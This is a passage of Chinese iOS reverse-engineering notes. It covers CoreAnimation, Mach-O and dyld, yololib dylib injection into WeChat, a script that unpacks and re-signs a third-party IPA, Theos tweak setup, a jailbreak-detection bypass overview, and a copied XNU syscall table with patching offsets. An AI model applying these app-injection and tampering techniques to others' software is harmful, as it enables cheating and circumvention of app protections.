  c. 渲染方面由于图像的渲染需要以60帧的刷新率在屏幕上同时更新，在非主线程异步化的情况下无法确定这个处理过程能够实现同步更新。

# iOS动画
1. CoreGraphics：

它是iOS的核心图形库，平时使用最频繁的point，size，rect等，都定义在这个框架中，类名以CG开头的都属于CoreGraphics框架，它提供的都是C语言的函数接口，是可以在iOS和macOS通用的。

2. QuartzCore：(CoreAnimation)

这个框架的名称感觉不是很清晰，不明确，但是看它的头文件可以发现，它其实就是CoreAnimation，这个框架的头文件只包含了CoreAnimation.h  类名以CA开头

CABasicAnimation的属性
属性	       说明
duration	动画的时长
repeatCount	重复的次数
repeatDuration	设置动画的时间，在改时间内一直执行，不计算次数
beginTime	指定动画开始时间
timingFunction	设置动画的速度变化
autoreverses	动画结束是否执行逆动画
fromValue	属性的起始值
toValue	结束的值
byValue	改变属性相同起始值的改变量

Keypath常用的属性：

Keypath	                 说明	   使用
transform.scale	        比例转化    @(cgfloat)
transform.scale.x	宽的比例	@(cgfloat)
transform.scale.y	高的比例	@(cgfloat)
transform.rotation.x	围绕x轴旋转	@(M_PI)
transform.rotation.y	围绕y轴旋转	@(M_PI)
transform.rotation.z	围绕z轴旋转	@(M_PI)
cornerRadius	        圆角的设置	@(50)
backgroundColor	        背景颜色的变化	(id)[uicolor redcolor].cgcolor
bounds	                大小，中心不变	[nsvalue valuewithcgrect:]
position	        位置(中心点的改变)	[nsvalue valuewithcgpoint]
contents	        内容(比如图片)	(id)image.cgimage
opacity             	透明度	@(cgfloat)
contentsRect.size.width	横向拉伸缩放(需要设置contents)	@(cgfloat)

CAKeyframeAnimation设置动画的路径分为两种

设置path
设置一组的values

CAAnimationGroup动画组
将多个动画合并到一起的动画就是CAAnimationGroup动画组

CATransition转场动画
CATransition是CAAnimation的子类，用于过渡动画或转场动画。为视图层移入移除屏幕提供转场动画

## Lua 脚本
```
     Lua 是一种轻量小巧的脚本语言，用标准C语言编写并以源代码形式开放，
     其设计目的是为了嵌入应用程序中，从而为应用程序提供灵活的扩展和定制功能。
     
     Lua的应用场景：

     游戏开发
     独立应用脚本
     Web 应用脚本
     扩展和数据库插件如：MySQL Proxy 和 MySQL
     WorkBench
     安全系统，如入侵检测系统


     触动精灵的应用场景：

     编写自己App的脚本完成自动化测试
     开挂刷机
     微信机器人（包括开发任意应用的机器人）
     因此我们可以轻易做出上面效果图的功能，但是需要移动设备必须是以下其一：

     (Root权限)越狱的iOS设备
     Root权限的Android设备
     具有Root权限的Android模拟器
     提醒：Android与iOS兼容大部分函数。
     模拟器连接编辑器比较麻烦，具体操作请查看官方文档。推荐使用天天模拟器，具有别的模拟器不具备的特性。
     
     
     开发所需的必备工具：

     具备windows/Mac环境开发(lua安装)
     在移动设备上安装触动精灵App
     IDE 脚本编辑器TouchSprite Studio
     取点抓色器TSColorPicker
```

## Mach-O 的组成结构

---- Header 包含该二进制文件的一般信息

            字节顺序、架构类型、加载指令的数量等。

---- Load commands 一张包含很多内容的表

                   内容包括区域的位置、符号表、动态符号表等。

---- __Data/__TEXT 包含Segement / Section

```
在工程编译时 , 所产生的 Mach-O 可执行文件中会预留出一段空间 , 
这个空间其实就是符号表 , 存放在 _DATA 数据段中  ( 因为 _DATA 段在运行时是可读可写的 ) 

编译时 : 工程中所有引用了共享缓存区中的系统库方法 , 其指向的地址设置成符号地址 ,  
( 例如工程中有一个 NSLog , 那么编译时就会在 Mach-O 中创建一个 NSLog 的符号 , 工程中的 NSLog 就指向这个符号 ) 

运行时 : 当 dyld将应用进程加载到内存中时 , 根据 load commands 中列出的需要加载哪些库文件 , 去做绑定的操作 
( 以 NSLog 为例 , dyld 就会去找到 Foundation 中 NSLog 的真实地址写到 _DATA 段的符号表中 NSLog 的符号上面 )
```
                   
## hook iOS App
### 1. 利用代码注入
1. .framework
下载yololib
将其复制到 usr/local/bin 中 
手动 cd 到Mach-O 文件这个目录(eg. XLsn0w.framework)
```
yololib Wechat Frameworks/XLsn0w.framework/XLsn0w
```

2. .dylib (eg. XLsn0w.dylib)
```
yololib "$TARGET_APP_PATH/$APP_BINARY" "Frameworks/XLsn0w.dylib"
```

### 2. 汇编修改Mach-O
修改 Mach-O 文件的 Load Commands

## Shell (.sh脚本)
```
# ${SRCROOT} 它是工程文件所在的目录
TEMP_PATH="${SRCROOT}/Temp"
#资源文件夹，我们提前在工程目录下新建一个APP文件夹，里面放ipa包
ASSETS_PATH="${SRCROOT}/APP"
#目标ipa包路径
TARGET_IPA_PATH="${ASSETS_PATH}/*.ipa"
#清空Temp文件夹
rm -rf "${SRCROOT}/Temp"
mkdir -p "${SRCROOT}/Temp"



#----------------------------------------
# 1. 解压IPA到Temp下
unzip -oqq "$TARGET_IPA_PATH" -d "$TEMP_PATH"
# 拿到解压的临时的APP的路径
TEMP_APP_PATH=$(set -- "$TEMP_PATH/Payload/"*.app;echo "$1")
# echo "路径是:$TEMP_APP_PATH"


#----------------------------------------
# 2. 将解压出来的.app拷贝进入工程下
# BUILT_PRODUCTS_DIR 工程生成的APP包的路径
# TARGET_NAME target名称
TARGET_APP_PATH="$BUILT_PRODUCTS_DIR/$TARGET_NAME.app"
echo "app路径:$TARGET_APP_PATH"

rm -rf "$TARGET_APP_PATH"
mkdir -p "$TARGET_APP_PATH"
cp -rf "$TEMP_APP_PATH/" "$TARGET_APP_PATH"



#----------------------------------------
# 3. 删除extension和WatchAPP.个人证书没法签名Extention
rm -rf "$TARGET_APP_PATH/PlugIns"
rm -rf "$TARGET_APP_PATH/Watch"



#----------------------------------------
# 4. 更新info.plist文件 CFBundleIdentifier
#  设置:"Set : KEY Value" "目标文件路径"
/usr/libexec/PlistBuddy -c "Set :CFBundleIdentifier $PRODUCT_BUNDLE_IDENTIFIER" "$TARGET_APP_PATH/Info.plist"


#----------------------------------------
# 5. 给MachO文件上执行权限
# 拿到MachO文件的路径WeChat
APP_BINARY=`plutil -convert xml1 -o - $TARGET_APP_PATH/Info.plist|grep -A1 Exec|tail -n1|cut -f2 -d\>|cut -f1 -d\<`
#上可执行权限
chmod +x "$TARGET_APP_PATH/$APP_BINARY"



#----------------------------------------
# 6. 重签名第三方 FrameWorks
TARGET_APP_FRAMEWORKS_PATH="$TARGET_APP_PATH/Frameworks"
if [ -d "$TARGET_APP_FRAMEWORKS_PATH" ];
then
for FRAMEWORK in "$TARGET_APP_FRAMEWORKS_PATH/"*
do


#签名
/usr/bin/codesign --force --sign "$EXPANDED_CODE_SIGN_IDENTITY" "$FRAMEWORK"
done
fi

```

## Tagged Pointer

1️⃣ : Tagged Pointer 专门用来存储小的对象，例如 NSNumber 和 NSDate

2️⃣ : Tagged Pointer 指针的值不再是地址了，而是真正的值。所以，实际上它不再是一个对象了，它只是一个披着对象皮的普通变量而已。所以，它的内存并不存储在堆中，也不需要 malloc 和 free

3️⃣ :  在内存读取上有着 3 倍的效率，创建时比以前快 106 倍 ( objc_msgSend 能识别 Tagged Pointer，比如 NSNumber 的 intValue 方法，直接从指针提取数据 )

4️⃣ : 使用 Tagged Pointer 后，指针内存储的数据变成了 Tag + Data，也就是将数据直接存储在了指针中 .

## lldb po
p 是 expr -的缩写。它的工作是把接收到的参数在当前环境下进行编译，然后打印出对应的值。

po 即 expr -o-。它所做的操作与p相同。如果接收到的参数是一个指针，那么它会调用对象的 description 方法并打印。如果接收到的参数是一个 core foundation 对象，那么它会调用 CFShow 方法并打印。如果这两个方法都调用失败，那么 po 打印出和 p 相同的内容。

总的来说，po 相对于 p 会打印出更多内容。一般在工作中，用 p 即可，因为 p 操作较少，效率更高。

p即是print，也是expression --的缩写，与po不同，它不会打出对象的详细信息，只会打印出一个$符号，数字，再加上一段地址信息。由于po命令下，对象的description 有可能被随便乱改，没有输出地址消息。

$符号在LLDB中代表着变量的分配。每次使用p后，会自动为你分配一个变量，后面再次想使用这个变量时，就可以直接使用。我们可以直接使用这个地址做一些转换，获取对象的信息

## 什么是 dyld?

dyld 是苹果的动态加载器 , 用来加载 image ( 注意: 这里的 image 不是指图片 , 而是 Mach-O 格式的二进制文件  )

当程序启动时 , 系统内核会首先加载 dyld , 而 dyld 会将我们的 APP 所依赖的各种库加载到内存中 ,
其中就包括 libobjc ( OC 和 runtime ) , 这些工作是在 APP 的 main 函数执行之前完成的.

_objc_init 是 Object-C - runtime 库的入口函数 , 在这里主要是读取 Mach-O 文件 OC 对应的 Segment section , 
并根据其中的数据代码信息 , 完成为 OC 的内存布局 , 以及初始化 runtime 相关的数据结构.

## dpkg-deb
```
1、dpkg-deb -x ./original.deb ./repackage
2、得到头文件class-dump -H original.app -o ./header
 
但如果对其逆向，修改后，要重新打包，则步骤如下：
1、建立文件夹目录
./repackage/DEBIAN
 
2、拆包
dpkg-deb -x ./original.deb ./repackage
执行之后，目录结构为：
./repackage/DEBIAN
./repackage/Applications
./repackage/Library
./repackage/usr
 
3、得到原deb信息
dpkg-deb -e ./original.deb repackage/DEBIAN
在DEBIAN目录下会得到包含control等5个文件
 
4、打包
dpkg-deb -b repackage new.deb

```

## dpkg

安装deb -i == -install
```
$ dpkg -i cn.xlsn0w.deb
```

卸载deb -r == -remove
```
$ dpkg -r cn.xlsn0w.deb
```

查看deb信息 -s == -see
```
$ dpkg -s cn.xlsn0w.deb 
```

## iOS大神金字塔
1.OC基础、UI层：熟练掌握各种组件的业务开发

2.runloop、runtime层：熟练掌握OC实现原理，定位各种异常问题

3.源码层：OC底层源码、比如objc、GNUStep 等源码，从底层原理上分析问题，解决问题

4.汇编层：熟悉OC在机器码层面实现，例如寄存器、汇编、Mach-O等

5.系统层：学习Drawin系统、BSD等

6.知识面的拓宽：Android、flutter、swift、shell、ruby、脚本等

7.硬件层：比如说集成电路、操作系统如何运转等等

## usbmuxd
usbmuxd将依赖于TCP/IP的命令的被连接方，通过本地端口映射。

用usb连接代替了网络连接，使得在没有网络的情况下也可以连接设备。

$  iproxy 2222 22 == 将本地电脑2222端口转发到usb连接设备22端口

### Makefile
```
DEBUG = false

THEOS_DEVICE_IP = localhost
THEOS_DEVICE_PORT = 2222

ARCHS = arm64 arm64e

TARGET = iphone:latest:11.0

THEOS_MAKE_PATH = /opt/theos/makefiles

include $(THEOS)/makefiles/common.mk

TWEAK_NAME = XLsn0wTweak

XLsn0wTweak_FILES = Tweak.xm

include $(THEOS_MAKE_PATH)/tweak.mk

after-install::
	install.exec "killall -9 SpringBoard"

```

1.设备安装openSSH插件, 安装usbmuxd(brew install usbmuxd)
2.把当前连接设备的22端口(SSH端口)映射到电脑的2222端口:(iproxy 2222 22)
3.theos想和设备22端口通信，直接和本地的2222端口通信即可
```
iproxy 2222 22 
```

### ssh连接设备IP==连接电脑本地localhost 127.0.0.1
```
ssh -p 2222 root@127.0.0.1

ssh root@localhost -p 22222
```

## dpkg -r packageName 卸载deb插件
1. ssh连接手机(ssh -p 2222 root@127.0.0.1)
2. 使用dpkg -r packageName (packageName是创建Tweak项目时输入的包名)
3. 注销SpringBoard 

```
iPhone-6:~ root# dpkg -r cn.xlsn0w.dock:iphoneos-arm
(Reading database ... 1896 files and directories currently installed.)
Removing cn.xlsn0w.dock (1.1.6-2) ...
```

### 执行make install命令安装deb插件
```
$     make install
==> Installing…
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
RSA key fingerprint is SHA256:9BPzMfuq0HFe2lkxXBRpdZSwg+if/NSbn1m2+7RudqM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.
Selecting previously unselected package cn.xlsn0w.dock.
(Reading database ... 3893 files and directories currently installed.)
Preparing to unpack /tmp/_theos_install.deb ...
Unpacking cn.xlsn0w.dock (1.1.5-4) ...
Setting up cn.xlsn0w.dock (1.1.5-4) ...
install.exec "killall -9 SpringBoard"
```
![iPod touch4](https://github.com/XLsn0w/Cydia/blob/master/iOS%206.1.6%20jailbreak.JPG?raw=true)

## .app手动压缩改后缀.ipa
```
1: 新建“Payload”文件夹;
2: 将.app包放到Payload中;
3: 在Payload文件夹上右键压缩成zip，然后将生成的.zip文件后缀改成.ipa即可
```

## macOS/iOS 签名工具
```
$ brew install ldid
```
 ### ldid工具：ldid是mac上的命令行工具，可以用于导出的签名文件、对文件进行重签名等操作。
 ### codesign工具：Mac上的命令行工具、也可以用于权限签名操作。

### dlopen 和 dlsym 方法动态加载库和调用函数
### Linux/unix/macOS/iOS 提供了使用 dlopen 和 dlsym 方法动态加载库和调用函数

UNIX 诞生于 20 世纪 60 年代末，
Windows 诞生于 20 世纪 80 年代中期，
Linux 诞生于 20 世纪 90 年代初，
可以说 UNIX 是操作系统中的"老大哥", Windows 和 Linux 都参考了 UNIX。

dlopen 打开一个库，获取句柄。
dlsym 在打开的库中查找符号的值。
dlclose 关闭句柄。
dlerror 返回一个描述最后一次调用dlopen、dlsym，或 dlclose 的错误信息的字符串。

## Makefile
Makefile关系到了整个工程的编译规则。一个工程中的源文件不计数，其按类型、功能、模块分别放在若干个目录中，
Makefile定义了一系列的规则来指定，哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作，
因为makefile就像一个Shell脚本一样，其中也可以执行操作系统的命令。

makefile带来的好处就是——“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了软件开发的效率。
make是一个命令工具，是一个解释makefile中指令的命令工具，一般来说，大多数的IDE都有这个命令，比如：Delphi的make，Visual C++的nmake，Linux下GNU的make。
可见，makefile都成为了一种在工程方面的编译方法。

## 绕过越狱检测
最近，苹果自己的App Store中有相当数量的应用程序正在实施一些程序，以检查运行该应用程序本身的设备的真实性，从而禁止或禁止某些功能甚至是整个应用程序的使用。
显而易见的原因是越狱的先天安全风险您的设备（例如，银行公司不希望将某些流氓键盘记录程序伪装成对您的帐户信息的调整来伪装）。

但是，在大多数情况下，公司似乎担心调整可能会绕过应用程序中实施的某些限制。视频流应用为此而臭名昭著。这些公司不希望用户绕过对何时何地可以流式传输其内容的限制，
因此，他们没有做负责任的事情并混淆了他们的限制尝试，而是阻止了所有越狱设备，无论它们是否出于恶意或缺乏意图。

## Kernel Syscalls -> https://www.theiphonewiki.com/wiki/Kernel_Syscalls
```
像往常一样，Args进入其普通寄存器，如R0 / X0中的arg1。Syscall＃输入IP（即过程内的，而不是指令指针！），也称为R12 / X16。

像在所有ARM中一样（在Android中也是如此），内核条目是由SVC命令（某些调试器和ARM方言中的SWI）完成的。在内核端，作为ExceptionVectorsBase的一部分安装了一个低级CPU异常处理程序（fleh_swi），并且-在发出SWI / SVC时-控件被转移到该地址。该处理程序可以检查系统调用号，以区分POSIX调用（非否定）和Mach陷阱（否定）。

Args go in their normal registers, like arg1 in R0/X0, as usual. Syscall # goes in IP (that's intra-procedural, not instruction pointer!), a.k.a R12/X16.

As in all ARM (i.e. also on Android) the kernel entry is accomplished by the SVC command (SWI in some debuggers and ARM dialects). On the kernel end, a low level CPU exception handler (fleh_swi) is installed as part of the ExceptionVectorsBase, and - upon issuing a SWI/SVC - control is transferred to that address. This handler can check the syscall number to distinguish between POSIX calls (non negative) and Mach traps (negative).

Unix
Usage
MOV IP, #x // number from following list into Intraprocedural, a.k.a. r12 on arm32 and x16 on arm64
SVC 0x80   // Formerly, SWI (software interrupt)
For example, arm32:


(gdb) disass chown
0x30d2ad54 <chown>:	mov	r12, #16	       ; 0x10, being # of chown
0x30d2ad58 <chown+4>:	svc	0x00000080
And arm64:

libsystem_kernel.dylib`chown:
    0x1866c6084 <+0>:  mov    x16, #0x10
    0x1866c6088 <+4>:  svc    #0x80
Most of these are the same as you would find in the XNU open source kernel, with ARM idiosyncrasies aside (and #372, ledger)

XNU中的系统调用表被称为“ sysent”，出于明显的原因（例如syscall挂钩），它不再是公共符号。但是，找到系统及其调用非常简单。尽管i0nic提出了一种基于导出的kdebug符号查找系统的启发式方法，但这是不可靠的，因为该符号不再被导出。更好的方法是进入struct sysent条目本身的模式，即-如bsd / sys / sysent.h中所定义：
sysent
The system call table in XNU is known as "sysent", and is no longer a public symbol, for obvious reasons (e.g. syscall hooking). It is fairly straightforward, however, to find the sysent and its calls. While i0nic proposes a heuristic of finding the sysent based on the exported kdebug symbol, this is unreliable, as the symbol is no longer exported. A better way is to home in on the pattern of the struct sysent entries itself, i.e - as defined in bsd/sys/sysent.h:


struct sysent {         /* system call table */
        int16_t         sy_narg;        /* number of args */
        int8_t          sy_resv;        /* reserved  */
        int8_t          sy_flags;       /* flags */
        sy_call_t       *sy_call;       /* implementing function */
        sy_munge_t      *sy_arg_munge32; /* system call arguments munger for 32-bit process */
        sy_munge_t      *sy_arg_munge64; /* system call arguments munger for 64-bit process */
        int32_t         sy_return_type; /* system call return types */
        uint16_t        sy_arg_bytes;   /* Total size of arguments in bytes for
                                         * 32-bit system calls
                                         */
};

Because system calls arguments are set in stone, it is straightforward to write code to find the signature of the first few syscalls (syscall, exit, fork..), and from there calculate the other sysent entries. A program to do so reliable on iOS has, in fact, been written, and produces the following output for iOS 6.0b1:

List of system calls from iOS 6.0 GM
note: Even though a syscall is present in the table, it does not in any way imply it is functional. Auditing, for example, is not enabled in iOS (no CONFIG_AUDIT in the XNU build). Most of these syscalls are the same as those of OS X, with the exception of ledger (which actually makes a comeback in OS X Mountain Lion), and 434+ (CONFIG_EMBEDDED).

A good reference on these can be found at Wiley's OS X and iOS Internals online appendix. The joker tool (shown below) can be downloaded from the same site.

$ joker -u ~/Documents/projects/iOS.6.0.iPod4.kernel 
This is an ARM binary. Applying iOS kernel signatures
Entry point is 0x80085084....This appears to be XNU 2107.2.33
Syscall names are @2a70f0
Sysent offset in file/memory (for patching purposes): 0x2ef0c0/0x802f00c0

Suppressing enosys (0x800b3429)  T = Thumb
1. exit                  801d4a74 T
2. fork                  801d7980 T
3. read                  801eb584 T
4. write                 801eb958 T
5. open                  800b13a4 T
6. close                 801ccab4 T
7. wait4                 801d56bc T
9. link                  800b18e8 T
10. unlink               800b1ff0 T
12. chdir                800b0c60 T
13. fchdir               800b0af0 T
14. mknod                800b14bc T
15. chmod                800b2b40 T
16. chown                800b2c9c T
18. getfsstat            800b088c T
20. getpid               801dc20c T
23. setuid               801dc4c0 T
24. getuid               801dc290 T
25. geteuid              801dc2a0 T
26. ptrace               801e812c T
27. recvmsg              8020a8fc T
28. sendmsg              8020a444 T
29. recvfrom             8020a528 T
30. accept               80209dfc T
31. getpeername          8020abc8 T
32. getsockname          8020ab18 T
33. access               800b24ac T
34. chflags              800b2928 T
35. fchflags             800b29f0 T
36. sync                 800b0320 T
37. kill                 801dfdcc T
39. getppid              801dc214 T
41. dup                  801cab04 T
42. pipe                 801edbe4 T
43. getegid              801dc318 T
46. sigaction            801deee8 T
47. getgid               801dc308 T
48. sigprocmask          801df42c T
49. getlogin             801dd0e8 T
50. setlogin             801dd160 T
51. acct                 801c54ec T
52. sigpending           801df5d0 T
53. sigaltstack          801dfd10 T
54. ioctl                801ebd1c T
55. reboot               801e8090 T
56. revoke               800b43f8 T
57. symlink              800b1b58 T
58. readlink             800b282c T
59. execve               801d4448 T
60. umask                800b43d0 T
61. chroot               800b0d30 T
65. msync                801d84d0 T
66. vfork                801d7018 T
73. munmap               801d857c T
74. mprotect             801d85b0 T
75. madvise              801d8668 T
78. mincore              801d86d4 T
79. getgroups            801dc328 T
80. setgroups            801dd02c T
81. getpgrp              801dc21c T
82. setpgid              801dc3c8 T
83. setitimer            801e7b78 T
85. swapon               8021be68 T
86. getitimer            801e7a30 T
89. getdtablesize        801ca6dc T
90. dup2                 801caf54 T
92. fcntl                801cb420 T
93. select               801ebfc8 T
95. fsync                800b3238 T
96. setpriority          801dd494 T
97. socket               802098a4 T
98. connect              80209e1c T
100. getpriority          801dd388 T
104. bind                 80209970 T
105. setsockopt           8020aa30 T
106. listen               80209adc T
 111. sigsuspend           801df5f8 T
116. gettimeofday         801e7840 T
117. getrusage            801de22c T
118. getsockopt           8020aa94 T
120. readv                801eb810 T
121. writev               801ebbb0 T
122. settimeofday         801e789c T
123. fchown               800b2dac T
124. fchmod               800b2c70 T
126. setreuid             801dc80c T
127. setregid             801dcba0 T
128. rename               800b3428 T
131. flock                801ce20c T
132. mkfifo               800b1798 T
133. sendto               8020a168 T
134. shutdown             8020aa00 T
135. socketpair           8020a00c T
136. mkdir                800b3d1c T
137. rmdir                800b3d5c T
138. utimes               800b2e60 T
139. futimes              800b3034 T
140. adjtime              801e79a0 T
142. gethostuuid          801ed6a4 T
147. setsid               801dc384 T
151. getpgid              801dc224 T
152. setprivexec          801dc1f4 T
153. pread                801eb774 T
154. pwrite               801ebad0 T
157. statfs               800b03c0 T
158. fstatfs              800b0678 T
159. unmount              800afe88 T
165. quotactl             800b03bc T
167. mount                800af068 T
169. csops                801dafd0 T
170. 170  old table       801db4bc T
173. waitid               801d5ab4 T
180. kdebug_trace         801c2db4 T
181. setgid               801dc9a4 T
182. setegid              801dcab0 T
183. seteuid              801dc710 T
184. sigreturn            8021e7e4 T
185. chud                 8021d4f4 T
187. fdatasync            800b32b0 T
188. stat                 800b2588 T
189. fstat                801ccfec T
190. lstat                800b26d4 T
191. pathconf             800b27c8 T
192. fpathconf            801cd048 T
194. getrlimit            801de074 T
195. setrlimit            801dd93c T
196. getdirentries        800b3f94 T
197. mmap                 801d7fc0 T
199. lseek                800b2068 T
200. truncate             800b30b4 T
201. ftruncate            800b3174 T
202. __sysctl             801e2478 T
203. mlock                801d8820 T
204. munlock              801d8878 T
205. undelete             800b1cf0 T
216. mkcomplex            800b12c4 T
220. getattrlist          8009b060 T
221. setattrlist          8009b0d8 T
222. getdirentriesattr    800b44e0 T
223. exchangedata         800b469c T
225. searchfs             800b48dc T
226. delete               800b202c T
227. copyfile             800b32cc T
228. fgetattrlist         80098488 T
229. fsetattrlist         8009b7e0 T
230. poll                 801ec72c T
231. watchevent           801ed054 T
232. waitevent            801ed1f8 T
233. modwatch             801ed368 T
234. getxattr             800b5550 T
235. fgetxattr            800b568c T
236. setxattr             800b578c T
237. fsetxattr            800b5898 T
238. removexattr          800b5994 T
239. fremovexattr         800b5a5c T
240. listxattr            800b5b1c T
241. flistxattr           800b5c00 T
242. fsctl                800b4dd4 T
243. initgroups           801dcea8 T
244. posix_spawn          801d351c T
245. ffsctl               800b5474 T
250. minherit             801d8630 T
266. shm_open             8020eb24 T
267. shm_unlink           8020f604 T
268. sem_open             8020df80 T
269. sem_close            8020e718 T
270. sem_unlink           8020e4e0 T
271. sem_wait             8020e76c T
272. sem_trywait          8020e834 T
273. sem_post             8020e8d8 T
274. sem_getvalue         8020e97c T
275. sem_init             8020e974 T
276. sem_destroy          8020e978 T
277. open_extended        800b11d8 T
278. umask_extended       800b4380 T
279. stat_extended        800b2530 T
280. lstat_extended       800b267c T
281. fstat_extended       801ccdd0 T
282. chmod_extended       800b2a30 T
283. fchmod_extended      800b2b74 T
284. access_extended      800b21a0 T
285. settid               801dcd2c T
286. gettid               801dc2b0 T
287. setsgroups           801dd03c T
288. getsgroups           801dc37c T
289. setwgroups           801dd040 T
290. getwgroups           801dc380 T
291. mkfifo_extended      800b16f4 T
292. mkdir_extended       800b3b30 T
294. shared_region_check_np 8021c3a4 T
296. vm_pressure_monitor  8021cb08 T
297. psynch_rw_longrdlock 802159ac T
298. psynch_rw_yieldwrlock 80215c60 T
299. psynch_rw_downgrade  80215c68 T
300. psynch_rw_upgrade    80215c64 T
301. psynch_mutexwait     80212bd8 T
302. psynch_mutexdrop     80213b9c T
303. psynch_cvbroad       80213bf0 T
304. psynch_cvsignal      802141c0 T
305. psynch_cvwait        80214648 T
306. psynch_rw_rdlock     80214d7c T
307. psynch_rw_wrlock     802159b0 T
308. psynch_rw_unlock     80215c6c T
309. psynch_rw_unlock2    80215f64 T
310. getsid               801dc254 T
311. settid_with_pid      801dcdcc T
312. psynch_cvclrprepost  80214c7c T
313. aio_fsync            801c5ed0 T
314. aio_return           801c60a8 T
315. aio_suspend          801c6330 T
316. aio_cancel           801c5a48 T
317. aio_error            801c5e24 T
318. aio_read             801c6088 T
319. aio_write            801c6544 T
320. lio_listio           801c6564 T
322. iopolicysys          801de420 T
323. process_policy       8021a72c T
324. mlockall             801d88b4 T
325. munlockall           801d88b8 T
327. issetugid            801dc4b0 T
328. __pthread_kill       801dfa44 T
329. __pthread_sigmask    801dfaa4 T
330. __sigwait            801dfb54 T
331. __disable_threadsignal 801df720 T
332. __pthread_markcancel 801df73c T
333. __pthread_canceled   801df784 T
334. __semwait_signal     801df924 T
336. proc_info            80218618 T
338. stat64               800b25d4 T
339. fstat64              801cd028 T
340. lstat64              800b2720 T
341. stat64_extended      800b2624 T
342. lstat64_extended     800b2770 T
343. fstat64_extended     801cd00c T
344. getdirentries64      800b4340 T
345. statfs64             800b06e0 T
346. fstatfs64            800b0828 T
347. getfsstat64          800b0a38 T
348. __pthread_chdir      800b0d28 T
349. __pthread_fchdir     800b0c58 T
350. audit                801c1a74 T
351. auditon              801c1a78 T
353. getauid              801c1a7c T
354. setauid              801c1a80 T
357. getaudit_addr        801c1a84 T
358. setaudit_addr        801c1a88 T
359. auditctl             801c1a8c T
360. bsdthread_create     80216ab8 T
361. bsdthread_terminate  80216d30 T
362. kqueue               801cf594 T
363. kevent               801cf614 T
364. lchown               800b2d94 T
365. stack_snapshot       801c520c T
366. bsdthread_register   80216d94 T
367. workq_open           802179e8 T
368. workq_kernreturn     80217e50 T
369. kevent64             801cf8ac T
370. __old_semwait_signal 801df7f8 T
371. __old_semwait_signal_nocancel 801df82c T
372. thread_selfid        80218354 T
373. ledger               801ed70c T
380. __mac_execve         801d4468 T
381. __mac_syscall        8027d0a8 T
382. __mac_get_file       8027cd50 T
383. __mac_set_file       8027cf98 T
384. __mac_get_link       8027ce74 T
385. __mac_set_link       8027d098 T
386. __mac_get_proc       8027c844 T
387. __mac_set_proc       8027c904 T
388. __mac_get_fd         8027cbfc T
389. __mac_set_fd         8027ce84 T
390. __mac_get_pid        8027c778 T
391. __mac_get_lcid       8027c9b8 T
392. __mac_get_lctx       8027ca7c T
393. __mac_set_lctx       8027cb38 T
394. setlcid              801dd228 T
395. getlcid              801dd310 T
396. read_nocancel        801eb5a4 T
397. write_nocancel       801eb978 T
398. open_nocancel        800b1434 T
399. close_nocancel       801ccad0 T
400. wait4_nocancel       801d56dc T
401. recvmsg_nocancel     8020a91c T
402. sendmsg_nocancel     8020a464 T
403. recvfrom_nocancel    8020a548 T
404. accept_nocancel      80209b1c T
405. msync_nocancel       801d84e8 T
406. fcntl_nocancel       801cb440 T
407. select_nocancel      801ebfe4 T
408. fsync_nocancel       800b32a8 T
409. connect_nocancel     80209e34 T
410. sigsuspend_nocancel  801df6b4 T
411. readv_nocancel       801eb830 T
412. writev_nocancel      801ebbd0 T
413. sendto_nocancel      8020a188 T
414. pread_nocancel       801eb794 T
415. pwrite_nocancel      801ebaf0 T
416. waitid_nocancel      801d5ad0 T
417. poll_nocancel        801ec74c T
420. sem_wait_nocancel    8020e788 T
421. aio_suspend_nocancel 801c6350 T
422. __sigwait_nocancel   801dfb8c T
423. __semwait_signal_nocancel 801df958 T
424. __mac_mount          800af08c T
425. __mac_get_mount      8027d2a0 T
426. __mac_getfsstat      800b08b0 T
427. fsgetpath            800b5ce4 T
428. audit_session_self   801c1a68 T
429. audit_session_join   801c1a6c T
430. fileport_makeport    801ce2f0 T
431. fileport_makefd      801ce494 T
432. audit_session_port   801c1a70 T
433. pid_suspend          8021c180 T
434. pid_resume           8021c1f0 T
435. pid_hibernate        8021c268 T
436. pid_shutdown_sockets 8021c2c0 T
438. shared_region_map_and_slide_np 8021c954 T
439. kas_info             8021cb50 T   ; Provides ASLR information to user space 
                                       ; (intentionally crippled in iOS, works in ML)
440. memorystatus_control 801e62a0 T   ;; Controls JetSam - supersedes old sysctl interface
441. guarded_open_np      801cead0 T  
442. guarded_close_np     801cebdc T

Mach
XNU also supports the Mach personality, which is distinct from that of the UNIX syscalls discussed above. Mach syscalls (on 32-bit systems like iOS) are encoded as negative numbers, which is clever, since POSIX system calls are all non-negative. For example, consider mach_msg_trap:

_mach_msg_trap:
0001a8b4        e1a0c00d        mov     ip, sp
0001a8b8        e92d0170        push    {r4, r5, r6, r8}
0001a8bc        e89c0070        ldm     ip, {r4, r5, r6}
0001a8c0        e3e0c01e        mvn     ip, #30 @ 0x1e    ; Move NEGATIVE -30 into IP (R12)
0001a8c4        ef000080        svc     0x00000080        ; issue a supervisor call
0001a8c8        e8bd0170        pop     {r4, r5, r6, r8}
0001a8cc        e12fff1e        bx      lr
..
_semaphore_signal_all_trap:
0001a8f8        e3e0c021        mvn     ip, #33 @ 0x21   ; NEGATIVE -33 into IP (R12)
0001a8fc        ef000080        svc     0x00000080
0001a900        e12fff1e        bx      lr

Mach system calls are commonly known as "traps", and are maintained in a Mach Trap table. iOS's fleh_swi handler (the kernel entry point on the other side of the "SWI" or "SVC" command) checks the system call number - if it is negative, it is flipped (2's complement), and interpreted as Mach trap instead.

mach_trap_table
In iOS 5.x, the mach_trap_table is not far from the page_size export, and right next to the trap names. kern_invalid is the equivalent of ENOSYS. All the traps are ARM Thumb. The joker binary can be used to find the Mach trap table, as well. The following shows iOS 6.0.b1's table:

$ ./joker -ls mach kernel.iPod4.iOS6.0b1
This is an ARM binary. Applying iOS kernel signatures
mach_trap_table offset in file (for patching purposes): 3064992 (0x2ec4a0)
Kern invalid should be 0x80027ec1. Ignoring those
..This appears to be XNU 2107.1.78
 10 _kernelrpc_mach_vm_allocate_trap         80014460 T
 12 _kernelrpc_mach_vm_deallocate_trap       800144cc T
 14 _kernelrpc_mach_vm_protect_trap          80014510 T
 16 _kernelrpc_mach_port_allocate_trap       80014564 T
 17 _kernelrpc_mach_port_destroy_trap        800145b4 T
